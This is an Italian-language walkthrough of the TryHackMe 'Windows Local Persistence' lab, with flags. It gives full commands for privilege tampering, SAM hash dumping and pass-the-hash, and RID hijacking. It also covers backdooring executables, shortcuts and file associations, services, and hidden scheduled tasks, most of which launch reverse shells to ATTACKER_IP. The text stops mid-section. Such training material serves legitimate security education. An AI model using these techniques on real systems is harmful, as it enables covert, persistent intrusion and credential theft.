#windowspersistenza


https://tryhackme.com/room/windowslocalpersistence


Dopo aver ottenuto il primo punto d'appoggio sulla rete interna del tuo obiettivo, dovrai assicurarti di non perderne l'accesso prima di arrivare effettivamente ai suoi gioielli. Stabilire la persistenza è uno dei primi compiti che dovremo svolgere come aggressori quando otterremo l'accesso a una rete. In parole povere, la persistenza si riferisce alla creazione di modi alternativi per riottenere l'accesso a un host senza dover ripetere la fase di exploit.

Dopo aver ottenuto il primo punto d'appoggio sulla rete interna del tuo obiettivo, dovrai assicurarti di non perderne l'accesso prima di arrivare effettivamente ai suoi gioielli. Stabilire la persistenza è uno dei primi compiti che dovremo svolgere come aggressori quando otterremo l'accesso a una rete. In parole povere, la persistenza si riferisce alla creazione di modi alternativi per riottenere l'accesso a un host senza dover ripetere la fase di exploit.

## Manomissione di account non privilegiati

Avere le credenziali di amministratore sarebbe il modo più semplice per ottenere la persistenza in una macchina. Tuttavia, per rendere più difficile per il team blu individuarci, possiamo manipolare gli utenti senza privilegi, che di solito non vengono monitorati quanto gli amministratori, e concedere loro in qualche modo privilegi amministrativi.

| RDP          |               |
| ------------ | ------------- |
| **Username** | Administrator |
| **Password** | Password321   |
Tieni presente che diamo per scontato che tu abbia già ottenuto in qualche modo l'accesso amministrativo e che da lì stai cercando di stabilire la persistenza .

```
xfreerdp3 /u:Administrator /p:Password321 /v:10.10.71.37
```

**Assegnare appartenenze a gruppi**

Per questa parte del compito, daremo per scontato che tu abbia scaricato gli hash delle password del computer della vittima e che tu sia riuscito a decifrare le password degli account non privilegiati in uso.

Il **modo diretto per far sì che un utente senza privilegi ottenga privilegi** amministrativi è inserirlo nel gruppo **Amministratori** . Possiamo facilmente farlo con il seguente comando:

Prompt dei comandi

```shell-session
net localgroup administrators thmuser0 /add
```

Ciò consentirà di accedere al server tramite RDP , WinRM o qualsiasi altro servizio di amministrazione remota disponibile.

Se questo vi sembra troppo sospetto, potete utilizzare il gruppo **Backup Operators** . **Gli utenti di questo gruppo non avranno privilegi amministrativi, ma potranno leggere/scrivere qualsiasi file o chiave di registro sul sistema**, ignorando qualsiasi DACL configurato . Questo **ci permetterebbe di copiare il contenuto degli hive di registro SAM e SYSTEM, che potremo quindi utilizzare per recuperare gli hash delle password di tutti gli utenti**, consentendoci di escalare qualsiasi account amministrativo senza problemi.

Per farlo, iniziamo aggiungendo l'account al gruppo Backup Operators:

Prompt dei comandi

```shell-session
net localgroup "Backup Operators" thmuser1 /add
```

Poiché si tratta di un account senza privilegi, non può accedere al computer tramite RDP o WinRM a meno che non lo aggiungiamo ai gruppi **Utenti Desktop remoto** ( RDP ) o **Utenti Gestione remota** (WinRM). Per questa attività utilizzeremo WinRM:

Prompt dei comandi

```shell-session
net localgroup "Remote Management Users" thmuser1 /add
```

Supponiamo di aver già scaricato le credenziali sul server e di conoscere la password di thmuser1. Connettiamoci tramite WinRM utilizzando le sue credenziali:

|   |   |
|---|---|
|**Nome utente**|thmuser1|
|**Password**|Password321|

Se provassi a connetterti in questo momento dal computer dell'aggressore, rimarresti sorpreso nel vedere che, anche se appartieni al gruppo Backups Operators, non saresti in grado di accedere a tutti i file come previsto. Un rapido controllo dei gruppi assegnati indicherebbe che apparteniamo al gruppo Backup Operators, ma il gruppo è disabilitato:

```
whoami /groups
```

```shell-session
user@AttackBox$ 

*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators               Alias            S-1-5-32-551 Group used for deny only
BUILTIN\Remote Management Users        Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192
```

**Ciò è dovuto al Controllo dell'account utente** ( UAC ). Una delle funzionalità implementate da UAC ,  **LocalAccountTokenFilterPolicy** , priva qualsiasi account locale dei suoi privilegi amministrativi quando accede da remoto. Sebbene sia possibile elevare i privilegi tramite UAC da una sessione utente grafica (per saperne di più su UAC, [clicca qui](https://tryhackme.com/room/windowsfundamentals1xbx) ), se si utilizza WinRM, si è limitati a un token di accesso limitato senza privilegi amministrativi.

**Per poter riottenere i privilegi di amministratore dal tuo utente, dovremo disabilitare LocalAccountTokenFilterPolicy modificando la seguente chiave di registro su 1:**

Prompt dei comandi

```shell-session
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Una volta configurato tutto, siamo pronti a utilizzare il nostro utente backdoor. Per prima cosa, stabiliamo una connessione WinRM e verifichiamo che il gruppo Backup Operators sia abilitato per il nostro utente:

```
evil-winrm -i 10.10.187.243 -u thmuser1 -p Password321
```

```
whoami /groups
```

```shell-session
user@AttackBox$ evil-winrm -i 10.10.177.185 -u thmuser1 -p Password321
        
*Evil-WinRM* PS C:\> whoami /groups

GROUP INFORMATION
-----------------

Group Name                           Type             SID          Attributes
==================================== ================ ============ ==================================================
Everyone                             Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                        Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Backup Operators             Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users      Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                 Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users     Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization       Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account           Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication     Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level Label            S-1-16-12288
```

Procediamo quindi a effettuare un backup dei file SAM e SYSTEM e li scarichiamo sul computer dell'aggressore:

**da AttackBox**

```shell-session
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
    The operation completed successfully.

*Evil-WinRM* PS C:\> download system.bak
    Info: Download successful!

*Evil-WinRM* PS C:\> download sam.bak
    Info: Download successful!
```

```
reg save hklm\system system.bak
```
```
reg save hklm\sam sam.bak
```
```
download system.bak
```
```
download sam.bak
```


**Nota:** se Evil-WinRM impiega troppo tempo per scaricare i file, sentiti libero di utilizzare qualsiasi altro metodo di trasferimento.

Con questi file possiamo scaricare gli hash delle password per tutti gli utenti utilizzando `secretsdump.py`o altri strumenti simili:

**AttackBox**

```shell-session
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL

Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x41325422ca00e6552bb6508215d8b426
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:1cea1d7e8899f69e89088c4cb4bbdaa3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:9657e898170eb98b25861ef9cafe5bd6:::
thmuser1:1011:aad3b435b51404eeaad3b435b51404ee:e41fd391af74400faa4ff75868c93cce:::
[*] Cleaning up...
```

Infine, esegui Pass-the-Hash per connetterti al computer della vittima con privilegi di amministratore:

**da AttackBox**
```shell-session
evil-winrm -i 10.10.177.185 -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

```
THM{FLAG_BACKED_UP!}
```

### Privilegi speciali e descrittori di sicurezza

Un risultato simile all'aggiunta di un utente al gruppo Backup Operators può essere ottenuto senza modificare l'appartenenza al gruppo. I gruppi speciali sono tali solo perché il sistema operativo assegna loro privilegi specifici per impostazione predefinita. **I privilegi** consistono semplicemente nella capacità di eseguire un'attività sul sistema stesso. Possono includere azioni semplici, come la possibilità di arrestare il server, ma anche operazioni altamente privilegiate, come la possibilità di assumere la proprietà di qualsiasi file sul sistema. Un elenco completo dei privilegi disponibili è disponibile [qui](https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants) come riferimento.

Nel caso del gruppo Backup Operators, per impostazione predefinita sono assegnati i due privilegi seguenti:

- **SeBackupPrivilege:** l'utente può leggere qualsiasi file nel sistema, ignorando qualsiasi DACL in atto.
- **SeRestorePrivilege:** l'utente può scrivere qualsiasi file nel sistema, ignorando qualsiasi DACL in atto.

Possiamo assegnare tali privilegi a qualsiasi utente, indipendentemente dalla sua appartenenza a un gruppo. Per farlo, possiamo usare il `secedit`comando: Per prima cosa, esportiamo la configurazione corrente in un file temporaneo:

```powershell
secedit /export /cfg config.inf
```

**Apriamo il file e aggiungiamo il nostro utente alle righe nella configurazione riguardanti SeBackupPrivilege e SeRestorePrivilege:**

```
SeBackupPrivilege = *S-1-5-32*551,thmuser2
```

Infine convertiamo il file .inf in un file .sdb che viene poi utilizzato per caricare nuovamente la configurazione nel sistema:

```powershell
secedit /import /cfg config.inf /db config.sdb

secedit /configure /db config.sdb /cfg config.inf
```

Ora dovresti avere un utente con privilegi equivalenti a quelli di qualsiasi Backup Operator. L'utente non riesce ancora ad accedere al sistema tramite WinRM, quindi proviamo a risolvere il problema. Invece di aggiungere l'utente al gruppo Remote Management Users, modificheremo il descrittore di sicurezza associato al servizio WinRM per consentire a thmuser2 di connettersi. Un **descrittore di sicurezza** può essere considerato come un ACL, ma applicato ad altre funzionalità del sistema.

Per aprire la finestra di configurazione per il descrittore di sicurezza di WinRM, è possibile utilizzare il seguente comando in Powershell (per questa operazione sarà necessario utilizzare la sessione GUI ):

```powershell
Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

Si aprirà una finestra in cui è possibile aggiungere thmuser2 e assegnargli tutti i privilegi per connettersi a WinRM:

Una volta fatto questo, il nostro utente potrà connettersi tramite WinRM. Poiché l'utente dispone dei privilegi SeBackup e SeRestore, possiamo ripetere i passaggi per recuperare gli hash delle password dal SAM e riconnetterci con l'utente Amministratore.

Si noti che affinché questo utente possa utilizzare appieno i privilegi assegnati, è necessario modificare la chiave del registro **LocalAccountTokenFilterPolicy** , ma lo abbiamo già fatto per ottenere il flag precedente.

Se controlli l'appartenenza del tuo utente al gruppo, sembrerà un utente normale. Niente di sospetto!

Prompt dei comandi

```shell-session
C:\> net user thmuser2
User name                    thmuser2

Local Group Memberships      *Users
Global Group memberships     *None
```

Ancora una volta, supponiamo di aver già scaricato le credenziali sul server e di avere la password di thmuser2. Connettiamoci con le sue credenziali tramite WinRM:

|   |   |
|---|---|
|**Nome utente**|thmuser2|
|**Password**|Password321|

Possiamo effettuare l'accesso con queste credenziali per ottenere la bandiera.

```
THM{IM_JUST_A_NORMAL_USER}
```

### Dirottamento RID

Un altro metodo per ottenere privilegi amministrativi senza essere un amministratore è modificare alcuni valori del registro di sistema per far sì che il sistema operativo creda che tu sia l'amministratore.

Quando un utente viene creato, gli viene assegnato un identificatore chiamato **ID Relativo (RID)** . Il RID è semplicemente un identificatore numerico che rappresenta l'utente nel sistema. Quando un utente effettua l'accesso, il processo LSASS ottiene il suo RID dall'hive del registro SAM e crea un token di accesso associato a tale RID. Se riusciamo a manomettere il valore del registro, possiamo fare in modo che Windows assegni un token di accesso Amministratore a un utente senza privilegi associando lo stesso RID a entrambi gli account.

In qualsiasi sistema Windows, all'account amministratore predefinito viene assegnato il **RID = 500** , mentre gli utenti normali hanno solitamente **un RID >= 1000** .

Per trovare i RID assegnati a qualsiasi utente, puoi utilizzare il seguente comando:

Prompt dei comandi
```
wmic useraccount get name,sid
```
```shell-session
C:\> wmic useraccount get name,sid

Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
thmuser1            S-1-5-21-1966530601-3185510712-10604624-1008
thmuser2            S-1-5-21-1966530601-3185510712-10604624-1009
thmuser3            S-1-5-21-1966530601-3185510712-10604624-1010
```

Il RID è l'ultimo bit del SID (1010 per thmuser3 e 500 per Administrator). Il SID è un identificatore che consente al sistema operativo di identificare un utente all'interno di un dominio, ma il resto non ci interessa molto per questa attività.

Ora non ci resta che assegnare il RID=500 a thmuser3. Per farlo, dobbiamo accedere al SAM tramite Regedit. Il SAM è riservato al solo account SYSTEM, quindi nemmeno l'amministratore potrà modificarlo. Per eseguire Regedit come SYSTEM, useremo psexec, disponibile nel `C:\tools\pstools`computer:

Prompt dei comandi

```shell-session
PsExec64.exe -i -s regedit
```

Da Regedit, andremo `HKLM\SAM\SAM\Domains\Account\Users\`dove ci sarà una chiave per ogni utente nel computer. Poiché vogliamo modificare thmuser3, dobbiamo cercare una chiave con il suo RID in esadecimale (1010 = 0x3F2). Sotto la chiave corrispondente, ci sarà un valore chiamato **F** , che contiene il RID effettivo dell'utente alla posizione 0x30:

Si noti che il RID viene memorizzato utilizzando la notazione little-endian, quindi i suoi byte appaiono invertiti.

Ora sostituiremo quei due byte con il RID dell'amministratore in esadecimale (500 = 0x01F4), scambiando i byte (F401):

Al successivo accesso di thmuser3, LSASS lo assocerà allo stesso RID dell'amministratore e gli concederà gli stessi privilegi.

Per questa attività, presumiamo che tu abbia già compromesso il sistema e ottenuto la password per thmuser3. Per comodità, l'utente può connettersi tramite RDP con le seguenti credenziali:

|   |   |
|---|---|
|**Nome utente**|thmuser3|
|**Password**|Password321|

Se hai eseguito tutto correttamente, dovresti aver effettuato l'accesso al desktop dell'amministratore. 

```
THM{TRUST_ME_IM_AN_ADMIN}
```

## Backdooring Files

Un altro metodo per stabilire la persistenza consiste nel manomettere alcuni file con cui sappiamo che l'utente interagisce regolarmente. Modificando tali file, possiamo installare backdoor che verranno eseguite ogni volta che l'utente vi accede. Poiché non vogliamo creare avvisi che potrebbero far saltare la nostra copertura, i file che modifichiamo devono continuare a funzionare per l'utente come previsto.

Sebbene esistano numerose possibilità per piantare backdoor, esamineremo quelle più comunemente utilizzate.

### File eseguibili

Se trovate un file eseguibile in giro per il desktop, è molto probabile che l'utente lo utilizzi frequentemente. Supponiamo di trovare un collegamento a PuTTY in giro. Se controllassimo le proprietà del collegamento, vedremmo che (di solito) punta a `C:\Program Files\PuTTY\putty.exe`. Da quel punto, potremmo scaricare l'eseguibile sul computer del nostro aggressore e modificarlo per eseguire qualsiasi payload desideriamo.

È possibile inserire facilmente un payload a piacere in qualsiasi file .exe con `msfvenom`. Il binario continuerà a funzionare normalmente, ma eseguirà un payload aggiuntivo in modo silenzioso aggiungendo un thread extra al binario. Per creare un putty.exe con backdoor, possiamo usare il seguente comando:

```shell-session
msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe
```

Il file puttyX.exe risultante eseguirà un payload reverse_tcp meterpreter senza che l'utente se ne accorga. Sebbene questo metodo sia sufficiente per stabilire la persistenza , diamo un'occhiata ad altre tecniche più subdole.

### File di collegamento

Se non vogliamo modificare l'eseguibile, possiamo sempre manomettere il file di collegamento stesso. Invece di puntare direttamente all'eseguibile previsto, possiamo modificarlo in modo che punti a uno script che eseguirà una backdoor e poi eseguirà normalmente il programma.

Per questa operazione, controlliamo il collegamento a **Calc** sul desktop dell'amministratore. Se clicchiamo con il tasto destro del mouse e andiamo su Proprietà, vedremo dove punta:

Prima di dirottare la destinazione del collegamento, creiamo un semplice script di PowerShell`C:\Windows\System32` in o in qualsiasi altra posizione nascosta. Lo script eseguirà una reverse shell e poi calc.exe dalla posizione originale nelle proprietà del collegamento:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4445"

C:\Windows\System32\calc.exe
```

Infine, modificheremo il collegamento in modo che punti al nostro script. Nota che l'icona del collegamento potrebbe essere modificata automaticamente durante questa operazione. Assicurati di riportare l'icona all'eseguibile originale in modo che l'utente non veda alcuna modifica visibile. Vogliamo anche eseguire il nostro script su una finestra nascosta, per la quale aggiungeremo l' `-windowstyle hidden`opzione a Powershell . L'obiettivo finale del collegamento sarebbe:

```powershell
powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
```

Avviamo un listener nc per ricevere la nostra reverse shell sulla macchina del nostro aggressore:

AttackBox

```shell-session
nc -lvp 4445
```

Facendo doppio clic sul collegamento, dovresti riuscire a connetterti nuovamente al computer dell'aggressore. Nel frattempo, l'utente otterrà una calcolatrice, proprio come previsto. Probabilmente noterai un prompt dei comandi che lampeggia e scompare immediatamente sullo schermo. Un utente normale potrebbe non preoccuparsene più di tanto, si spera.

```
c:\flags>flag5.exe
flag5.exe
THM{NO_SHORTCUTS_IN_LIFE}
```

### Dirottamento delle associazioni di file

Oltre a persistere tramite eseguibili o scorciatoie, possiamo dirottare qualsiasi associazione di file per forzare il sistema operativo a eseguire una shell ogni volta che l'utente apre un tipo di file specifico.

Le associazioni predefinite dei file del sistema operativo sono conservate all'interno del registro, dove viene memorizzata una chiave per ogni singolo tipo di file sotto `HKLM\Software\Classes\`. Supponiamo di voler verificare quale programma viene utilizzato per aprire i file .txt; possiamo semplicemente cercare la `.txt`sottochiave e trovare quale **ID Programmatico (ProgID)**  è associato ad essa. Un ProgID è semplicemente un identificativo di un programma installato sul sistema. Per i file .txt, avremo il seguente ProgID:

Possiamo quindi cercare una sottochiave per il ProgID corrispondente (sempre in `HKLM\Software\Classes\`), in questo caso  `txtfile`, dove troveremo un riferimento al programma responsabile della gestione dei file .txt. La maggior parte delle voci ProgID avrà una sottochiave in `shell\open\command`cui è specificato il comando predefinito da eseguire per i file con quell'estensione:

In questo caso, quando si tenta di aprire un file .txt, il sistema eseguirà `%SystemRoot%\system32\NOTEPAD.EXE %1`, dove `%1`rappresenta il nome del file aperto. Se volessimo dirottare questa estensione, potremmo sostituire il comando con uno script che esegue una backdoor e poi apre il file come di consueto. Per prima cosa, creiamo uno script ps1 con il seguente contenuto e salviamolo in `C:\Windows\backdoor2.ps1`:

```powershell
Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe ATTACKER_IP 4448"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Nota come in Powershell dobbiamo passare `$args[0]`al blocco note, poiché conterrà il nome del file da aprire, come indicato tramite `%1`.

Ora modifichiamo la chiave di registro per eseguire il nostro script backdoor in una finestra nascosta:


Infine, crea un listener per la tua reverse shell e prova ad aprire un file .txt qualsiasi sul computer della vittima (creane uno se necessario). Dovresti ricevere una reverse shell con i privilegi dell'utente che apre il file.

```
THM{TXT_FILES_WOULD_NEVER_HURT_YOU}
```

## Abuso dei servizi

I servizi Windows offrono un ottimo modo per stabilire la persistenza , poiché possono essere configurati per essere eseguiti in background ogni volta che viene avviato il computer della vittima. Se riusciamo a sfruttare un servizio per eseguire qualcosa per noi, possiamo riprendere il controllo del computer della vittima ogni volta che viene avviato.

Un servizio è fondamentalmente un file eseguibile che viene eseguito in background. Quando si configura un servizio, si definisce quale file eseguibile verrà utilizzato e si seleziona se il servizio verrà eseguito automaticamente all'avvio del computer o se dovrà essere avviato manualmente.

Esistono due modi principali per sfruttare in modo improprio i servizi per stabilire la persistenza : creare un nuovo servizio o modificarne uno esistente per eseguire il nostro payload.

Creazione di servizi backdoor

Possiamo creare e avviare un servizio denominato "THMservice" utilizzando i seguenti comandi:

```shell-session
sc.exe create THMservice binPath= "net user Administrator Passwd123" start= auto
sc.exe start THMservice
```

**Nota:** affinché il comando funzioni, è necessario che dopo ogni segno di uguale ci sia uno spazio.

Il comando "net user" verrà eseguito all'avvio del servizio, reimpostando la password dell'amministratore a `Passwd123`. Notare come il servizio sia stato impostato per l'avvio automatico (start=auto), in modo che venga eseguito senza richiedere l'interazione dell'utente.

Reimpostare la password di un utente funziona abbastanza bene, ma possiamo anche creare una reverse shell con msfvenom e associarla al servizio creato. Si noti, tuttavia, che gli eseguibili dei servizi sono unici poiché devono implementare un protocollo specifico per essere gestiti dal sistema. Se si desidera creare un eseguibile compatibile con i servizi Windows, è possibile utilizzare il `exe-service`formato in msfvenom:

AttackBox

```shell-session
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4448 -f exe-service -o rev-svc.exe
```

È quindi possibile copiare l'eseguibile sul sistema di destinazione, ad esempio in, `C:\Windows`e puntare il binPath del servizio ad esso:

```shell-session
sc.exe create THMservice2 binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start THMservice2
```

Questo dovrebbe creare una connessione con la macchina dell'aggressore.
```
THM{SUSPICIOUS_SERVICES}
```


### Modifica dei servizi esistenti

Sebbene la creazione di nuovi servizi per la persistenza funzioni abbastanza bene, il team blu potrebbe monitorare la creazione di nuovi servizi in tutta la rete. Potremmo voler riutilizzare un servizio esistente invece di crearne uno nuovo per evitare il rilevamento. In genere, qualsiasi servizio disabilitato è un buon candidato, in quanto potrebbe essere modificato senza che l'utente se ne accorga.

È possibile ottenere un elenco dei servizi disponibili utilizzando il seguente comando:
  
Prompt dei comandi

```shell-session
C:\> sc.exe query state=all
SERVICE_NAME: THMService1
DISPLAY_NAME: THMService1
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 1077  (0x435)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
```

Dovresti riuscire a trovare un servizio arrestato chiamato THMService3. Per interrogare la configurazione del servizio, puoi usare il seguente comando:

Prompt dei comandi

```shell-session
C:\> sc.exe qc THMService3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMService3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2 AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\MyService\THMService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMService3
        DEPENDENCIES       : 
        SERVICE_START_NAME : NT AUTHORITY\Local Service
```

Ci sono tre cose a cui dobbiamo prestare attenzione quando utilizziamo un servizio per la persistenza :

- L'eseguibile ( **BINARY_PATH_NAME** ) dovrebbe puntare al nostro payload.
- Il servizio **START_TYPE** dovrebbe essere automatico in modo che il payload venga eseguito senza interazione da parte dell'utente.
- Il **SERVICE_START_NAME** , ovvero l'account con cui verrà eseguito il servizio, dovrebbe essere preferibilmente impostato su **LocalSystem** per ottenere i privilegi SYSTEM.

Iniziamo creando una nuova reverse shell con msfvenom:

AttackBox

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=5558 -f exe-service -o rev-svc2.exe
```

Per riconfigurare i parametri "THMservice3", possiamo utilizzare il seguente comando:

Prompt dei comandi

```shell-session
C:\> sc.exe config THMservice3 binPath= "C:\Windows\rev-svc2.exe" start= auto obj= "LocalSystem"
```

È quindi possibile interrogare nuovamente la configurazione del servizio per verificare se tutto è andato come previsto:

Prompt dei comandi

```shell-session
C:\> sc.exe qc THMservice3
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: THMservice3
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\rev-svc2.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : THMservice3
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem
```

```
THM{IN_PLAIN_SIGHT}
```

## Abuso delle attività pianificate

Possiamo anche utilizzare attività pianificate per stabilire la persistenza, se necessario. Esistono diversi modi per pianificare l'esecuzione di un payload nei sistemi Windows. Vediamone alcuni:

Utilità di pianificazione

Il modo più comune per pianificare le attività è utilizzare l'Utilità di pianificazione integrata **di Windows** . L'Utilità di pianificazione consente un controllo granulare dell'avvio delle attività, consentendo di configurare attività che si attiveranno a orari specifici, si ripeteranno periodicamente o addirittura si attiveranno al verificarsi di specifici eventi di sistema. Dalla riga di comando, è possibile `schtasks`interagire con l'Utilità di pianificazione. Un riferimento completo per il comando è disponibile sul [sito web di Microsoft](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks) .

Creiamo un'attività che esegua una reverse shell ogni minuto. In uno scenario reale, non vorresti che il tuo payload venisse eseguito così spesso, ma non vogliamo aspettare troppo a lungo per questa stanza:

Prompt dei comandi

```shell-session
C:\> schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
SUCCESS: The scheduled task "THM-TaskBackdoor" has successfully been created.
```

**Nota:** assicurati di utilizzare `THM-TaskBackdoor`come nome dell'attività, altrimenti non riceverai la segnalazione.

Il comando precedente creerà un'attività " THM -TaskBackdoor" ed eseguirà una  `nc64`reverse shell verso l'attaccante. Le opzioni `/sc`e `/mo`indicano che l'attività deve essere eseguita ogni minuto. L' `/ru`opzione indica che l'attività verrà eseguita con privilegi di SISTEMA.

Per verificare se la nostra attività è stata creata correttamente, possiamo usare il seguente comando:

Prompt dei comandi
```
schtasks /query /tn thm-taskbackdoor
```
```shell-session
C:\> schtasks /query /tn thm-taskbackdoor

Folder: \
TaskName                                 Next Run Time          Status
======================================== ====================== ===============
thm-taskbackdoor                         5/25/2022 8:08:00 AM   Ready
```

Rendere invisibile il nostro compito

La nostra attività dovrebbe essere già attiva e funzionante, ma se l'utente compromesso prova a elencare le sue attività pianificate, la nostra backdoor sarà visibile. Per nascondere ulteriormente la nostra attività pianificata, possiamo renderla invisibile a qualsiasi utente nel sistema eliminando il suo **Descrittore di Sicurezza (SD)** . Il descrittore di sicurezza è semplicemente un ACL che indica quali utenti hanno accesso all'attività pianificata. Se il tuo utente non è autorizzato a interrogare un'attività pianificata, non sarai più in grado di vederla, poiché Windows ti mostra solo le attività per cui sei autorizzato a utilizzare. Eliminare l'SD equivale a impedire a tutti gli utenti di accedere all'attività pianificata, inclusi gli amministratori.

I descrittori di sicurezza di tutte le attività pianificate sono memorizzati in `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\`. Per ogni attività è presente una chiave di registro, sotto la quale è presente un valore denominato "SD" che contiene il descrittore di sicurezza. È possibile cancellare il valore solo se si possiedono privilegi di SISTEMA.

Per nascondere la nostra attività, eliminiamo il valore SD per l'attività " THM -TaskBackdoor" creata in precedenza. Per farlo, useremo `psexec`(disponibile in `C:\tools`) per aprire Regedit con privilegi di SISTEMA:

Prompt dei comandi

```shell-session
c:\tools\pstools\PsExec64.exe -s -i regedit
```

Elimineremo quindi il descrittore di sicurezza per la nostra attività:

Se proviamo a interrogare nuovamente il nostro servizio, il sistema ci dirà che tale attività non esiste:

Prompt dei comandi

```shell-session
C:\> schtasks /query /tn thm-taskbackdoor ERROR: The system cannot find the file specified.
```

Se avviamo un listener nc nella macchina del nostro aggressore, dovremmo ricevere una shell dopo un minuto:

AttackBox

```shell-session
user@AttackBox$ nc -lvp 4449
```

```
THM{JUST_A_MATTER_OF_TIME}
```

## Persistenza attivata dall'accesso

Alcune azioni eseguite da un utente potrebbero anche essere vincolate all'esecuzione di payload specifici per la persistenza . I sistemi operativi Windows offrono diversi modi per collegare i payload a interazioni specifiche. Questa attività esaminerà i modi per installare payload che verranno eseguiti quando un utente accede al sistema.

Cartella di avvio

Ogni utente ha una cartella in `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup`cui è possibile inserire gli eseguibili da eseguire ogni volta che l'utente effettua l'accesso. Un aggressore può ottenere la persistenza semplicemente inserendo un payload lì. Si noti che ogni utente eseguirà solo ciò che è disponibile nella propria cartella.

Se vogliamo obbligare tutti gli utenti a eseguire un payload durante l'accesso, possiamo utilizzare la cartella sottostante `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` allo stesso modo.

Per questo compito, generiamo un payload shell inverso utilizzando msfvenom:

AttackBox

```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

Copiamo quindi il nostro payload nella macchina della vittima. Puoi generare un comando `http.server`con Python3 e usare wget sulla macchina della vittima per estrarre il file:

|   |   |   |
|---|---|---|
|AttackBox<br><br>```shell-session<br>user@AttackBox$ python3 -m http.server <br>Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... <br>```|➜|Powershell<br><br>```shell-session<br>PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe<br>```|

Quindi memorizziamo il payload nella `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp`cartella per ottenere una shell per qualsiasi utente che acceda alla macchina.

Prompt dei comandi

```shell-session
